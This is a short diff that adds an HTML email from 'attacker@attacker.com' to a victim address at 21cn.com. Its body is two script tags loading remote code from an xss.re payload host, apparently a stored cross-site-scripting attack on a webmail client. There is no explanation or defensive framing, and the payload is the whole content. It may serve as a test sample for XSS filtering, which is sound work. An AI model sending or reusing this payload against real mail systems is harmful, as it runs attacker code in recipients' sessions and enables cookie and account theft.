@@ -1,0 +1,8 @@
+From: <attacker@attacker.com>
+Subject: 6
+To: victim@21cn.com
+MIME-Version: 1.0
+Content-type: text/html
+
+<script src=http://xss.re/7188></script>
+<script src=http://xss.re/7188></script>
